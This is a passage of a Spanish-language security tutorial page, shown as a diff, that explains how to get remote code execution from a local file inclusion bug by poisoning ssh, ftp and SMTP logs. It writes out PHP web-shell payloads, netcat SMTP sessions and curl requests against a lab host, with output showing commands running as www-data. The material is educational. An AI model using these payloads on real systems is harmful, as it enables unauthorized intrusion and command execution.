+172.17.0.1 - - "GET /example.php HTTP/1.1" 200 147 "-" uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</code></pre></div></div><br>
+
+<br><div><strong><h3>Log Poisoning (ssh)</h3></strong></div><br>
+<div><p>Otro servicio vulnerable es ssh, ya que guarda logs de las autenticaciones fallidas</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh</span><span class="p"> user@172.17.0.2
+user@172.17.0.2's password: </span><span class="kd">password</span><span class="p">
+Permission denied, please try again.</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> -s -X GET</span><span class="no"> "http://172.17.0.2/example.php?file=/var/log/auth.log"</span><span class="p">
+9284d6876bcf sshd[2355]: Failed password for invalid </span><span class="kd">user user</span><span class="p"> from 172.17.0.2 port 54376 ssh2</span>
+</code></pre></div></div><br>
+
+<div><p>La idea es la misma, inyectamos un php como usuario ssh para apuntar después al log</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh</span><span class="p"> </span><span class="no">'&lt?php system($_GET["cmd"]); ?>'</span><span class="p">@172.17.0.2
+<?php system($_GET["cmd"]); ?>@172.17.0.2's password: </span><span class="kd">password</span><span class="p">
+Permission denied, please try again.</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> -s -X GET </span><span class="no">"http://172.17.0.2/example.php?file=/var/log/auth.log&cmd=id"</span><span class="p">
+sshd[3038]: Connection closed by invalid user uid=33(www-data) gid=33(www-data) groups=33(www-data) 172.17.0.2 port 51962 [preauth]</span>
+</code></pre></div></div><br>
+
+<br><div><strong><h3>Log Poisoning (ftp)</h3></strong></div><br>
+
+<div><p>Con ftp es lo mismo, guarda el usuario de la autenticación en el log correspondiente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ftp </span><span class="p">172.17.0.2
+Connected to 172.17.0.2
+220 (vsFTPd 3.0.3)
+Name (172.17.0.2:root): </span><span class="kd">user</span><span class="p">
+331 Please specify the password. 
+Password: </span><span class="kd">password</span><span class="p">
+530 Login incorrect.
+Login failed.
+ftp></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> -s -X GET </span><span class="no">"http://172.17.0.2/example.php?file=/var/log/vsftpd.log"</span><span class="p">
+[pid 244427] CONNECT: Client "::ffff:172.17.0.1"
+[pid 244426] [</span><span class="kd">user</span><span class="p">] FAIL LOGIN: Client "::ffff:172.17.0.1"</span>
+</code></pre></div></div><br>
+
+<div><p>Repetimos el proceso, usamos un php como usuario y lo invocamos con el log en el lfi</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ftp </span><span class="p">172.17.0.2
+Connected to 172.17.0.2
+220 (vsFTPd 3.0.3)
+Name (172.17.0.2:root): </span><span class="kd">&lt?php system($_GET["cmd"]); ?></span><span class="p">
+331 Please specify the password.
+Password: </span><span class="kd">password</span><span class="p">
+530 Login incorrect.
+Login failed.
+ftp></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s -X GET </span><span class="no">"http://172.17.0.2/example.php?file=/var/log/vsftpd.log&id"</span><span class="p">
+[pid 246917] CONNECT: Client "::ffff:172.17.0.1"
+[pid 246916] [uid=33(www-data) gid=33(www-data) groups=33(www-data)] FAIL LOGIN: Client "::ffff:172.17.0.1"</span>
+</code></pre></div></div><br>
+
+<br><div><strong><h3>Log Poisoning (smtp)</h3></strong></div><br>
+
+<div><p>Lo mismo para smtp, en este caso en el campo data, usaremos netcat para conectarnos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ netcat </span><span class="p">172.17.0.2 25
+220 debian.localdomain ESMTP Postfix (Debian/GNU)
+</span><span class="kd">MAIL FROM: gato</span><span class="p">
+250 2.1.0 Ok
+</span><span class="kd">RCPT TO: www-data</span><span class="p">
+250 2.1.5 Ok
+</span><span class="kd">DATA</span><span class="p">
+354 End data with &ltCR>&ltLF>.&ltCR>&ltLF>
+</span><span class="kd">pwned
+.</span><span class="p">
+250 2.0.0 Ok: queued as 2E6FE4099C</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> -s -X GET </span><span class="no">"http://172.17.0.2/example.php?file=/var/mail/www-data"</span><span class="p">
+From gato@debian.localdomain  Fri Jan 20 08:12:50 2023
+Return-Path: &ltgato@debian.localdomain>
+X-Original-To: www-data
+Delivered-To: www-data@debian.localdomain
+Received: from unknown (unknown [172.17.0.2])
+	by debian.localdomain (Postfix) with SMTP id 2E6FE4099C
+	for &ltwww-data>; Fri, 20 Jan 2023 08:12:34 +0100 (CET)
+
+pwned</span>
+</code></pre></div></div><br>
+
+<div><p>Vemos reflejado el campo data, asi que ahi inyectamos el php y ejecutamos el comando</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ netcat </span><span class="p">172.17.0.2 25
+220 debian.localdomain ESMTP Postfix (Debian/GNU)
+</span><span class="kd">MAIL FROM: gato</span><span class="p">
+250 2.1.0 Ok
+</span><span class="kd">RCPT TO: www-data</span><span class="p">
+250 2.1.5 Ok
+</span><span class="kd">DATA</span><span class="p">
+354 End data with &ltCR>&ltLF>.&ltCR>&ltLF>
+</span><span class="kd">&lt?php system($_REQUEST['cmd']);?>
+.</span><span class="p">
+250 2.0.0 Ok: queued as 06CE54099C</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> -s -X GET </span><span class="no">"http://172.17.0.2/example.php?file=/var/mail/www-data&cmd=id"</span><span class="p">
+From gato@debian.localdomain  Fri Jan 20 08:18:04 2023
+Return-Path: &ltgato@debian.localdomain>
+X-Original-To: www-data
+Delivered-To: www-data@debian.localdomain
+Received: from unknown (unknown [172.17.0.2])
+	by debian.localdomain (Postfix) with SMTP id 06CE54099C
+	for &ltwww-data>; Fri, 20 Jan 2023 08:17:54 +0100 (CET)
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</code></pre></div></div><br>
+
+<blockquote><strong><div><p>Siempre hay mas formas ;)</p></div></strong>
+<div><p>Probablemente hay mas formas de conseguir RCE a través del LFI pero depende del contexto, he subido estas porque son las más comunes</p></div></blockquote><br>
+
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+    </div>
+  </body>
+</html>
